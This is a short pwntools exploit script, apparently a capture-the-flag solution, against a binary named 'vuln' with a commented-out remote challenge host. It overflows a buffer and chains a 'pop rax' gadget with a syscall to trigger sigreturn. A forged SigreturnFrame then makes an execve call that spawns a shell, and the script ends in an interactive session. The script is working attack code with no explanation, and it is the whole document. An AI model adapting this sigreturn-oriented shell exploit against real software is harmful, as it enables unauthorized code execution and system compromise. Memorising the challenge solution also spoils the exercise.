from pwn import *

elf = context.binary = ELF('vuln')
io = process()
#io = remote('chall.ycfteam.in','2222')

pop_rax = pack(0x0000000010000018)
syscall = pack(0x0000000010000015)

frame = SigreturnFrame()
frame.rax = 59
frame.rdi = 0x10000250  # bin/bash
frame.rsi = 0
frame.rdx = 0
frame.rip = 0x0000000010000015  # syscall

payload = cyclic(8)+ pop_rax + pack(15) + syscall + bytes(frame)
io.sendline(payload)

io.interactive()
